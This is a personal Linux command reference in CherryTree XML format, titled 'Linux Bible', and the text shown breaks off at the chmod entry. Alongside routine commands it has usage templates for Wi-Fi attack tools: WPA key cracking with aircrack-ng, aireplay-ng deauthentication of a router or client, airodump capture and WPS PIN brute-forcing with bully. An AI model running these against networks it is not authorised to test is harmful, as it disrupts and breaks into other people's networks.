<?xml version="1.0" encoding="UTF-8"?>
<cherrytree>
  <bookmarks list=""/>
  <node name="Info" unique_id="358" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="12" is_bold="0" foreground="" ts_creation="1725521274" ts_lastsave="1730250589">
    <rich_text underline="single" scale="h1" weight="heavy">Linux Bible</rich_text>
    <rich_text>

• </rich_text>
    <rich_text weight="heavy">T</rich_text>
    <rich_text>his bible is for:
Regular users, programers, hackers and who those love Linux Open-Source Operation Systems

• </rich_text>
    <rich_text weight="heavy">A</rich_text>
    <rich_text>uthor
Write and gathering by </rich_text>
    <rich_text weight="heavy">“MKinG”</rich_text>
    <rich_text scale="sub"> (with  </rich_text>
    <rich_text scale="sub" weight="heavy">Cherrytree</rich_text>
    <rich_text scale="sub">)</rich_text>
    <rich_text>
</rich_text>
    <rich_text underline="single">Gmail</rich_text>
    <rich_text>:	mking4everking@gmail.com
</rich_text>
    <rich_text underline="single">Github</rich_text>
    <rich_text>:	github.com/mking4ever

• </rich_text>
    <rich_text weight="heavy">T</rich_text>
    <rich_text>esting systems
   ◇ Ubuntu
      ▪ ubuntu 14.04
      ▪ ubuntu 16

   ◇ Kali
      ▪ kali 2023 (Debain base)
      ▪ Kali 2024 6.6.9 

	
• </rich_text>
    <rich_text weight="heavy">V</rich_text>
    <rich_text>ersion 10.1.1 (First Release Version)
• </rich_text>
    <rich_text weight="heavy">T</rich_text>
    <rich_text>imestamp 1725521412

• </rich_text>
    <rich_text weight="heavy">C</rich_text>
    <rich_text>urrent	</rich_text>
    <rich_text weight="heavy">V</rich_text>
    <rich_text>ersion </rich_text>
    <rich_text weight="heavy">10.6.0</rich_text>
    <rich_text> (1730250573)
• </rich_text>
    <rich_text weight="heavy">L</rich_text>
    <rich_text>ast		</rich_text>
    <rich_text weight="heavy">V</rich_text>
    <rich_text>ersion </rich_text>
    <rich_text weight="heavy">10.5.0</rich_text>
    <rich_text> (1729180586)
</rich_text>
  </node>
  <node name="Commands" unique_id="284" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="54" is_bold="0" foreground="" ts_creation="1695265868" ts_lastsave="1728275532">
    <rich_text scale="h1">Linux Most important commands</rich_text>
    <rich_text>
</rich_text>
    <node name="All" unique_id="4" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="21" is_bold="0" foreground="" ts_creation="1684283270" ts_lastsave="1728544797">
      <rich_text scale="h1">All commands sorted by alphabet</rich_text>
      <node name="$" unique_id="36" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684283822" ts_lastsave="1724795731">
        <rich_text>$PATH
PATH=$PAHT:/bin:/sbin:/usr/bin:/usr/sbin

$USER
$0</rich_text>
      </node>
      <node name="adduser" unique_id="330" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1724699790" ts_lastsave="1724699844">
        <rich_text>$ </rich_text>
        <rich_text foreground="#2e2ec2c27e7e">adduser</rich_text>
        <rich_text> &lt;username&gt;
</rich_text>
      </node>
      <node name="airmon-ng" unique_id="313" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1724142743" ts_lastsave="1728486088">
        <rich_text weight="heavy">• See devices with: "</rich_text>
        <rich_text background="#1a1a5f5fb4b4" weight="heavy">ip address</rich_text>
        <rich_text weight="heavy">", "</rich_text>
        <rich_text background="#1a1a5f5fb4b4" weight="heavy">ifconfig</rich_text>
        <rich_text weight="heavy">", "</rich_text>
        <rich_text background="#1a1a5f5fb4b4" weight="heavy">iwconfig</rich_text>
        <rich_text weight="heavy">"</rich_text>
        <rich_text>

</rich_text>
        <rich_text weight="heavy">• Turn device </rich_text>
        <rich_text background="#a5a51d1d2d2d" weight="heavy">OFF</rich_text>
        <rich_text weight="heavy"> and </rich_text>
        <rich_text background="#2626a2a26969" weight="heavy">ON</rich_text>
        <rich_text> (monitor/managed mode)
$ </rich_text>
        <rich_text background="#1a1a5f5fb4b4">ifconfig</rich_text>
        <rich_text> wlan0 down
$ </rich_text>
        <rich_text background="#1a1a5f5fb4b4">ifconfig</rich_text>
        <rich_text> wlan0 up

</rich_text>
        <rich_text weight="heavy">• AIRMON-NG</rich_text>
        <rich_text>
</rich_text>
        <rich_text foreground="#6262a0a0eaea">airmon-ng</rich_text>
        <rich_text> 
 |_ </rich_text>
        <rich_text foreground="#6262a0a0eaea">airodump-ng</rich_text>
        <rich_text>
 |_ </rich_text>
        <rich_text foreground="#6262a0a0eaea">airreplay-ng</rich_text>
        <rich_text>
 |_ </rich_text>
        <rich_text foreground="#6262a0a0eaea">aircrack-ng</rich_text>
        <rich_text>
</rich_text>
        <node name="aircrack-ng" unique_id="224" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684287123" ts_lastsave="1724732783">
          <rich_text scale="h1" weight="heavy">$ aircrack-ng</rich_text>
          <rich_text>
802.11 WEP / WPA-PSK key cracker

usage: </rich_text>
          <rich_text background="#1a1a5f5fb4b4">aircrack-ng</rich_text>
          <rich_text> [options] &lt;input file(s)&gt;

EXAMPLE:
</rich_text>
          <rich_text background="#1a1a5f5fb4b4">aircrack-ng</rich_text>
          <rich_text> -a 2 -w ./my_wordlist.txt --bssid &lt;xx:xx:xx:xx:xx:xx&gt; -l /tmp/wifitepr96qd0v/wpakey.txt hs/handshake_My_WiFi_xx-xx-xx-xx-xx-xx_2023-06-11T16-19-57.cap

Common options:

      -a &lt;amode&gt; : force attack mode (</rich_text>
          <rich_text foreground="#ffffa3a34848">1</rich_text>
          <rich_text>/WEP, </rich_text>
          <rich_text foreground="#ffffa3a34848">2</rich_text>
          <rich_text>/WPA-PSK)
      -e &lt;essid&gt; : target selection: network identifier
      -b &lt;bssid&gt; : target selection: access point's MAC
      -p &lt;nbcpu&gt; : # of CPU to use  (default: all CPUs)
      -q         : enable quiet mode (no status output)
      -C &lt;macs&gt;  : merge the given APs to a virtual one
      -l &lt;file&gt;  : write key to file. Overwrites file.

WEP and WPA-PSK cracking options:

      -w &lt;words&gt; : path to wordlist(s) filename(s)
      -N &lt;file&gt;  : path to new session filename
      -R &lt;file&gt;  : path to existing session filename


example:
</rich_text>
          <rich_text weight="heavy">$ aircrack-ng FILE_NAME.cap
$ aircrack-ng FILE_NAME.cap -w wordlist.txt</rich_text>
        </node>
        <node name="aireplay-ng" unique_id="226" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684287154" ts_lastsave="1728492799">
          <rich_text scale="h1" weight="heavy">$ aireplay-ng</rich_text>
          <rich_text>

$ </rich_text>
          <rich_text background="#1a1a5f5fb4b4">aireplay-ng</rich_text>
          <rich_text>

</rich_text>
          <rich_text scale="h3" weight="heavy">Deauthenticate client</rich_text>
          <rich_text>
$ </rich_text>
          <rich_text background="#1a1a5f5fb4b4">aireplay-ng</rich_text>
          <rich_text> </rich_text>
          <rich_text foreground="#777776767b7b">&lt;interface&gt;</rich_text>
          <rich_text> --deauth </rich_text>
          <rich_text foreground="#777776767b7b">0</rich_text>
          <rich_text> -a </rich_text>
          <rich_text foreground="#777776767b7b">&lt;MAC&gt;</rich_text>
          <rich_text> 
$ </rich_text>
          <rich_text background="#1a1a5f5fb4b4">aireplay-ng</rich_text>
          <rich_text> </rich_text>
          <rich_text foreground="#777776767b7b">&lt;interface&gt;</rich_text>
          <rich_text> --deauth </rich_text>
          <rich_text foreground="#777776767b7b">0</rich_text>
          <rich_text> -a </rich_text>
          <rich_text foreground="#777776767b7b">&lt;MAC&gt;</rich_text>
          <rich_text> -c </rich_text>
          <rich_text foreground="#777776767b7b">&lt;MAC&gt; </rich_text>
        </node>
        <node name="airmon-ng" unique_id="314" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1724143609" ts_lastsave="1724980599">
          <rich_text scale="h1" weight="heavy">$ airmon-ng</rich_text>
          <rich_text>

$ </rich_text>
          <rich_text background="#1a1a5f5fb4b4">airmon-ng</rich_text>
          <rich_text>

$ </rich_text>
          <rich_text background="#1a1a5f5fb4b4">airmon-ng</rich_text>
          <rich_text> --verbose
$ </rich_text>
          <rich_text background="#1a1a5f5fb4b4">airmon-ng</rich_text>
          <rich_text> --debug

$ </rich_text>
          <rich_text background="#1a1a5f5fb4b4">airmon-ng</rich_text>
          <rich_text> check
$ </rich_text>
          <rich_text background="#1a1a5f5fb4b4">airmon-ng</rich_text>
          <rich_text> check kill

$ </rich_text>
          <rich_text background="#1a1a5f5fb4b4">airmon-ng</rich_text>
          <rich_text> start &lt;interface&gt;
$ </rich_text>
          <rich_text background="#1a1a5f5fb4b4">airmon-ng</rich_text>
          <rich_text> stop &lt;interface&gt;</rich_text>
        </node>
        <node name="airodump-ng" unique_id="225" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684287134" ts_lastsave="1728492866">
          <rich_text scale="h1" weight="heavy">$ airodump-ng </rich_text>
          <rich_text>

$ </rich_text>
          <rich_text background="#1a1a5f5fb4b4">airodump-ng</rich_text>
          <rich_text> </rich_text>
          <rich_text foreground="#777776767b7b">&lt;interface&gt;</rich_text>
          <rich_text>
$ </rich_text>
          <rich_text background="#1a1a5f5fb4b4">airodump-ng</rich_text>
          <rich_text> </rich_text>
          <rich_text foreground="#777776767b7b">&lt;interface&gt;</rich_text>
          <rich_text> --bssid/-b </rich_text>
          <rich_text foreground="#777776767b7b">&lt;MAC&gt;</rich_text>
          <rich_text> -c </rich_text>
          <rich_text foreground="#777776767b7b">&lt;chanel&gt;</rich_text>
          <rich_text> -w </rich_text>
          <rich_text foreground="#777776767b7b">&lt;output-file&gt;</rich_text>
          <rich_text> </rich_text>
        </node>
        <node name="Help" unique_id="346" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="202" is_bold="0" foreground="" ts_creation="1724732516" ts_lastsave="1728492824">
          <rich_text scale="h1">• </rich_text>
          <rich_text scale="h1" weight="heavy">Airmon</rich_text>
          <rich_text>
$ </rich_text>
          <rich_text foreground="#6262a0a0eaea">airmon-ng</rich_text>
          <rich_text>
$ </rich_text>
          <rich_text foreground="#6262a0a0eaea">airmon-ng</rich_text>
          <rich_text> --verbose </rich_text>
          <rich_text foreground="#5e5e5c5c6464">/</rich_text>
          <rich_text> --debug
$ </rich_text>
          <rich_text foreground="#6262a0a0eaea">airmon-ng</rich_text>
          <rich_text> check
$ </rich_text>
          <rich_text foreground="#6262a0a0eaea">airmon-ng</rich_text>
          <rich_text> check kill
$ </rich_text>
          <rich_text foreground="#6262a0a0eaea">airmon-ng</rich_text>
          <rich_text> start &lt;interface&gt;
$ </rich_text>
          <rich_text foreground="#6262a0a0eaea">airmon-ng</rich_text>
          <rich_text> stop &lt;interface&gt;

</rich_text>
          <rich_text scale="h1">• </rich_text>
          <rich_text scale="h1" weight="heavy">Airodump</rich_text>
          <rich_text>
$ </rich_text>
          <rich_text foreground="#1a1a5f5fb4b4">airdump-ng</rich_text>
          <rich_text> &lt;interface&gt;
$ </rich_text>
          <rich_text foreground="#1a1a5f5fb4b4">airdump-ng</rich_text>
          <rich_text> &lt;interface&gt; --bssid &lt;MAC&gt;  -c &lt;chanel&gt; -w &lt;output-file&gt;

</rich_text>
          <rich_text scale="h1">• </rich_text>
          <rich_text scale="h1" weight="heavy">Aireplay</rich_text>
          <rich_text>
$ </rich_text>
          <rich_text foreground="#81813d3d9c9c">aireplay-ng</rich_text>
          <rich_text> &lt;interface&gt; --deauth 0 -a &lt;BSSID:Router&gt;
$ </rich_text>
          <rich_text foreground="#81813d3d9c9c">aireplay-ng</rich_text>
          <rich_text> &lt;interface&gt; --deauth 0 -a &lt;BSSID:Router&gt; -c &lt;BSSID:Client&gt;

</rich_text>
          <rich_text scale="h1">• </rich_text>
          <rich_text scale="h1" weight="heavy">Reset</rich_text>
          <rich_text>
# </rich_text>
          <rich_text foreground="#6262a0a0eaea">airmon-ng</rich_text>
          <rich_text> stop wlan0mon
# </rich_text>
          <rich_text foreground="#5757e3e38989">service</rich_text>
          <rich_text> networking restart
# </rich_text>
          <rich_text foreground="#18b2b2">NetworkManager</rich_text>
          <rich_text>
# </rich_text>
          <rich_text foreground="#ffffbebe6f6f">ifconfig</rich_text>
          <rich_text> wlan0 </rich_text>
          <rich_text weight="heavy">up</rich_text>
          <rich_text foreground="#9a9a99999696">/down</rich_text>
          <rich_text>

</rich_text>
          <rich_text scale="h1">• </rich_text>
          <rich_text scale="h1" weight="heavy">Convert cap to hc22000</rich_text>
          <rich_text>
$ </rich_text>
          <rich_text foreground="#86865e5e3c3c">hcxpcapngtool</rich_text>
          <rich_text> -o output.hc22000 input.pcap</rich_text>
        </node>
      </node>
      <node name="alias" unique_id="78" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684284788" ts_lastsave="1729652550">
        <rich_text scale="h1" weight="heavy">alias</rich_text>
        <rich_text>(Examples)

</rich_text>
        <rich_text background="#c0c0bfbfbcbc" foreground="#3d3d38384646"># Quick Actions</rich_text>
        <rich_text family="monospace" foreground="#9999c1c1f1f1">
alias s='sudo su'

</rich_text>
        <rich_text background="#c0c0bfbfbcbc" foreground="#3d3d38384646"># Quick Exit</rich_text>
        <rich_text family="monospace" foreground="#9999c1c1f1f1">
alias q='exit'
alias x='exit'
</rich_text>
        <rich_text>
</rich_text>
        <rich_text background="#c0c0bfbfbcbc" foreground="#3d3d38384646"># Quick Clear</rich_text>
        <rich_text>
</rich_text>
        <rich_text family="monospace" foreground="#9999c1c1f1f1">alias c='clear'
alias ..='clear'</rich_text>
        <rich_text>

</rich_text>
        <rich_text background="#c0c0bfbfbcbc" foreground="#3d3d38384646"># Simple Directory View</rich_text>
        <rich_text>
</rich_text>
        <rich_text family="monospace" foreground="#9999c1c1f1f1">alias ls='ls --color'
alias ll='ls -al --color'</rich_text>
        <rich_text family="monospace">
</rich_text>
        <rich_text>
</rich_text>
        <rich_text background="#c0c0bfbfbcbc" foreground="#3d3d38384646"># Pro Directory view</rich_text>
        <rich_text>
</rich_text>
        <rich_text family="monospace" foreground="#9999c1c1f1f1">alias lm='ls -AFCX'
alias ln='echo PWD: $(pwd);echo;lm -l'</rich_text>
        <rich_text>

</rich_text>
        <rich_text background="#c0c0bfbfbcbc" foreground="#3d3d38384646"># Python</rich_text>
        <rich_text>
</rich_text>
        <rich_text family="monospace" foreground="#9999c1c1f1f1">alias py='python3'
alias pych='/home/nightfox/pycharm/bin/pycharm.sh'</rich_text>
        <rich_text>

</rich_text>
        <rich_text background="#c0c0bfbfbcbc" foreground="#3d3d38384646"># Service</rich_text>
        <rich_text>
</rich_text>
        <rich_text family="monospace" foreground="#9999c1c1f1f1">alias srv='service --status-all'
alias srx='service --status-all | grep "+"'</rich_text>
        <rich_text>

</rich_text>
        <rich_text background="#c0c0bfbfbcbc" foreground="#3d3d38384646"># Github</rich_text>
        <rich_text>
</rich_text>
        <rich_text family="monospace" foreground="#9999c1c1f1f1">alias g='git'
alias gs='git status'
alias gl='git log'
alias gb='git branch'
alias gc='git checkout'
alias gm='git checkout master'
</rich_text>
        <rich_text>
</rich_text>
        <node name="mine" unique_id="403" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1729650727" ts_lastsave="1729652603">
          <rich_text># NightFox Alias

# short hand
alias q='exit'
alias s='sudo su'
alias c='clear'

# Pro Directory view
alias lm='ls -AFCX'
alias ln='echo PWD: $(pwd);echo;lm -l'

# python
alias py='python3'
alias pych='/home/nightfox/pycharm/bin/pycharm.sh'

# service
alias srv='service --status-all'
alias srx='service --status-all | grep "+"'

# git
alias g='git'
alias gs='git status'
alias gl='git log'
alias gb='git branch'
alias gc='git checkout'
alias gm='git checkout master'

</rich_text>
        </node>
      </node>
      <node name="apropose" unique_id="72" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684284548" ts_lastsave="1686721956">
        <rich_text scale="h1">$ apropos</rich_text>
        <rich_text>

apropos (1)          - search the manual page names and descriptions</rich_text>
      </node>
      <node name="apt" unique_id="84" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684284978" ts_lastsave="1728096366">
        <rich_text scale="h1" weight="heavy">APT</rich_text>
        <rich_text>
apt (8)              - command-line interface

</rich_text>
        <rich_text weight="heavy">Usage:</rich_text>
        <rich_text>
apt update
apt upgrade
apt install [PACKAGE]
apt autoremove
</rich_text>
        <node name="Optional" unique_id="363" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1727982957" ts_lastsave="1727983476">
          <rich_text>Openssl:
</rich_text>
          <rich_text family="monospace">apt install libssl-dev</rich_text>
          <rich_text>
</rich_text>
        </node>
        <node name="Kali Update" unique_id="366" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1727983509" ts_lastsave="1727983653">
          <rich_text>updatedb

apt update

apt list --upgradable
apt upgrade

apt install [Package]

</rich_text>
        </node>
        <node name="--help" unique_id="367" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1727983546" ts_lastsave="1727983547">
          <rich_text>apt 2.5.6 (amd64)
Usage: apt [options] command

apt is a commandline package manager and provides commands for
searching and managing as well as querying information about packages.
It provides the same functionality as the specialized APT tools,
like apt-get and apt-cache, but enables options more suitable for
interactive use by default.

Most used commands:
  list - list packages based on package names
  search - search in package descriptions
  show - show package details
  install - install packages
  reinstall - reinstall packages
  remove - remove packages
  autoremove - automatically remove all unused packages
  update - update list of available packages
  upgrade - upgrade the system by installing/upgrading packages
  full-upgrade - upgrade the system by removing/installing/upgrading packages
  edit-sources - edit the source information file
  satisfy - satisfy dependency strings
</rich_text>
        </node>
      </node>
      <node name="apt-get" unique_id="85" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684284983" ts_lastsave="1728096355">
        <rich_text scale="h1" weight="heavy">APT-GET</rich_text>
        <rich_text>
apt-get (8)          - APT package handling utility -- command-line interface

</rich_text>
        <rich_text weight="heavy">Usage:</rich_text>
        <rich_text>
apt-get update
apt-get upgrade
apt-get install [PACKAGE]
apt-get -f install</rich_text>
      </node>
      <node name="arp" unique_id="10" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684283329" ts_lastsave="1728096447">
        <rich_text scale="h1" weight="heavy">arp</rich_text>
        <rich_text>
arp (8)              - manipulate the system ARP cache</rich_text>
      </node>
      <node name="arp-scan" unique_id="11" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684283337" ts_lastsave="1728096435">
        <rich_text scale="h1" weight="heavy">arp-scan</rich_text>
        <rich_text>
the system ARP cacheystem ARP cache

arp-scan --local
arp-scan --local-net</rich_text>
      </node>
      <node name="aspell" unique_id="74" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684284564" ts_lastsave="1695261974">
        <rich_text>aspell (1)           - interactive spell checker
</rich_text>
      </node>
      <node name="bash" unique_id="77" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684284766" ts_lastsave="1684285590">
        <rich_text>#!/bin/bash

bash /home/user/script.sh
bash ./script.sh
./script.sh  # with ‘./’ you say its executable file</rich_text>
      </node>
      <node name="bully" unique_id="232" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684287548" ts_lastsave="1724730600">
        <rich_text scale="h1" weight="heavy">bully</rich_text>
        <rich_text>

bully: Bully is a new implementation of the WPS brute force attackwritten in C


usage: </rich_text>
        <rich_text foreground="#35358484e4e4">bully</rich_text>
        <rich_text foreground="#2e2ec2c27e7e"> &lt;</rich_text>
        <rich_text foreground="#8f8ff0f0a4a4">options</rich_text>
        <rich_text foreground="#2e2ec2c27e7e">&gt; </rich_text>
        <rich_text foreground="#8f8ff0f0a4a4">interface</rich_text>
        <rich_text>

Required arguments:

  </rich_text>
        <rich_text foreground="#8f8ff0f0a4a4">interface</rich_text>
        <rich_text>      : Wireless interface in monitor mode (root required)

  </rich_text>
        <rich_text foreground="#8f8ff0f0a4a4">-b</rich_text>
        <rich_text>,</rich_text>
        <rich_text foreground="#8f8ff0f0a4a4"> --bssid macaddr</rich_text>
        <rich_text>    : MAC address of the target access point
Or
  </rich_text>
        <rich_text foreground="#8f8ff0f0a4a4">-e</rich_text>
        <rich_text>,</rich_text>
        <rich_text foreground="#8f8ff0f0a4a4"> --essid string</rich_text>
        <rich_text>     : Extended SSID for the access point


# example
Attack the wireless ESSID (</rich_text>
        <rich_text family="monospace">-e 6F36E6</rich_text>
        <rich_text>) through the monitor mode interface (</rich_text>
        <rich_text family="monospace">wlan0mon</rich_text>
        <rich_text>):
</rich_text>
        <rich_text family="monospace">$ bully -e 6F36E6 wlan0mon</rich_text>
        <node name="-h" unique_id="342" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1724730184" ts_lastsave="1724730354">
          <rich_text family="monospace">bully -h

  bully v1.4
  the fork that actually works!
  maintained by kimocoder - https://twitter.com/kimocoder

  usage: bully &lt;options&gt; interface

  Required arguments:

      interface      : Wireless interface in monitor mode (root required)

      -b, --bssid macaddr    : MAC address of the target access point
   Or
      -e, --essid string     : Extended SSID for the access point

  Optional arguments:

      -c, --channel N[,N...] : Channel number of AP, or list to hop [b/g]
      -i, --index N          : Starting pin index (7 or 8 digits)  [Auto]
      -l, --lockwait N       : Seconds to wait if the AP locks WPS   [43]
      -o, --outfile file     : Output file for messages          [stdout]
      -p, --pin N            : Starting pin number (7 or 8 digits) [Auto]
      -s, --source macaddr   : Source (hardware) MAC address      [Probe]
      -u, --lua              : Lua script file                           
      -v, --verbosity N      : Verbosity level 1-4, 1 is quietest     [3]
      -w, --workdir path     : Location of pin/session files  [~/.bully/]
      -5, --5ghz             : Hop on 5GHz a/n default channel list  [No]
      -B, --bruteforce       : Bruteforce the WPS pin checksum digit [No]
      -F, --force            : Force continue in spite of warnings   [No]
      -S, --sequential       : Sequential pins (do not randomize)    [No]
      -T, --test             : Test mode (do not inject any packets) [No]

  Advanced arguments:

      -d, --pixiewps         : Attempt to use pixiewps               [No]
      -a, --acktime N        : Deprecated/ignored                  [Auto]
      -r, --retries N        : Resend packets N times when not acked  [2]
      -m, --m13time N        : Deprecated/ignored                  [Auto]
      -t, --timeout N        : Deprecated/ignored                  [Auto]
      -1, --pin1delay M,N    : Delay M seconds every Nth nack at M5 [0,1]
      -2, --pin2delay M,N    : Delay M seconds every Nth nack at M7 [5,1]
      -A, --noacks           : Disable ACK check for sent packets    [No]
      -C, --nocheck          : Skip CRC/FCS validation (performance) [No]
      -D, --detectlock       : Detect WPS lockouts unreported by AP  [No]
      -E, --eapfail          : EAP Failure terminate every exchange  [No]
      -L, --lockignore       : Ignore WPS locks reported by the AP   [No]
      -M, --m57nack          : M5/M7 timeouts treated as WSC_NACK's  [No]
      -N, --nofcs            : Packets don't contain the FCS field [Auto]
      -P, --probe            : Use probe request for nonbeaconing AP [No]
      -Q, --wpsinfo          : Use probe request to gather WPS info  [No]
      -R, --radiotap         : Assume radiotap headers are present [Auto]
      -W, --windows7         : Masquerade as a Windows 7 registrar   [No]
      -Z, --suppress         : Suppress packet throttling algorithm  [No]
      -V, --version          : Print version info and exit
      -h, --help             : Display this help information</rich_text>
        </node>
      </node>
      <node name="burpsuite" unique_id="22" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684283649" ts_lastsave="1725162958">
        <rich_text scale="h1" weight="heavy">burpsuite (web proxy GUI)</rich_text>
        <rich_text> 

Usage:
--help                            Print this message
--version                         Print version details
--disable-extensions              Prevent loading of extensions on startup
--diagnostics                     Print diagnostic information
--use-defaults                    Start with default settings
--collaborator-server             Run in Collaborator server mode
--collaborator-config             Specify Collaborator server configuration file; defaults to collaborator.config
--data-dir                        Specify data directory
--project-file                    Open the specified project file; this will be created as a new project if the file does not exist
--developer-extension-class-name  Fully qualified name of locally-developed extension class; extension will be loaded from the classpath
--config-file                     Load the specified project configuration file(s); this option may be repeated to load multiple files
--user-config-file                Load the specified user configuration file(s); this option may be repeated to load multiple files
--auto-repair                     Automatically repair a corrupted project file specified by the --project-file option
--unpause-spider-and-scanner      Do not pause the Spider and Scanner when opening an existing project
--disable-auto-update             Suppress auto update behavior
</rich_text>
      </node>
      <node name="bzip" unique_id="141" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285308" ts_lastsave="1684285312"/>
      <node name="bzip2" unique_id="143" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285316" ts_lastsave="1684285323"/>
      <node name="cal" unique_id="133" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285270" ts_lastsave="1724730719">
        <rich_text scale="h1" weight="heavy">cal</rich_text>
        <rich_text>

$ cal

cal			- calender</rich_text>
      </node>
      <node name="cat" unique_id="101" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285101" ts_lastsave="1729458317">
        <rich_text scale="h1" weight="heavy">cat
</rich_text>
        <rich_text>
cat (1)              - concatenate files and print on the standard output
tac (1)              - concatenate and print files in reverse

</rich_text>
        <rich_text foreground="#35358484e4e4">cat</rich_text>
        <rich_text> &lt;file-name&gt;
</rich_text>
        <rich_text foreground="#35358484e4e4">tac</rich_text>
        <rich_text> &lt;file-name&gt;


---[</rich_text>
        <rich_text weight="heavy">C</rich_text>
        <rich_text>ombine]----------------------------------------------------
# </rich_text>
        <rich_text weight="heavy">Combine</rich_text>
        <rich_text> 2 wordlist:
</rich_text>
        <rich_text foreground="#5757e3e38989">$ cat file1.txt file2.txt &gt; output.txt</rich_text>
        <rich_text>


---[</rich_text>
        <rich_text weight="heavy">R</rich_text>
        <rich_text>emove]-----------------------------------------------------
# </rich_text>
        <rich_text weight="heavy">Remove</rich_text>
        <rich_text> </rich_text>
        <rich_text weight="heavy">duplicate</rich_text>
        <rich_text> from 1 file:
</rich_text>
        <rich_text foreground="#5757e3e38989">$ cat file.txt | sort | uniq &gt; output.txt</rich_text>
        <rich_text>

# </rich_text>
        <rich_text weight="heavy">Remove duplicate</rich_text>
        <rich_text> from 2 file:
</rich_text>
        <rich_text foreground="#5757e3e38989">$ cat file1.txt file2.txt | sort | uniq &gt; output.txt</rich_text>
        <rich_text>
</rich_text>
      </node>
      <node name="cd" unique_id="113" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285149" ts_lastsave="1724730948">
        <rich_text scale="h1" weight="heavy">cd</rich_text>
        <rich_text>


# home
$ </rich_text>
        <rich_text foreground="#35358484e4e4">cd</rich_text>
        <rich_text> ~

# root directory
$ </rich_text>
        <rich_text foreground="#35358484e4e4">cd</rich_text>
        <rich_text> ~

# backward directory
$ </rich_text>
        <rich_text foreground="#35358484e4e4">cd</rich_text>
        <rich_text> ..

# two backward directory
$ </rich_text>
        <rich_text foreground="#35358484e4e4">cd</rich_text>
        <rich_text> ../.. </rich_text>
        <rich_text foreground="#5e5e5c5c6464">or more</rich_text>
        <rich_text> ../../../../..


cd			- change directorycd: change directory</rich_text>
      </node>
      <node name="chage" unique_id="79" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684284880" ts_lastsave="1724731019">
        <rich_text>chage (1)            - change user password expiry information
</rich_text>
      </node>
      <node name="chgrp" unique_id="145" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285333" ts_lastsave="1724731039">
        <rich_text>chgrp (1)            - change group ownership

</rich_text>
      </node>
      <node name="chmod" unique_id="66" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684284493" ts_lastsave="1724699695">
        <rich_text>chmod (1)            - change file mode bits
chmod (2)            - change permissions of a file

# EXAMPLE

# </rich_text>
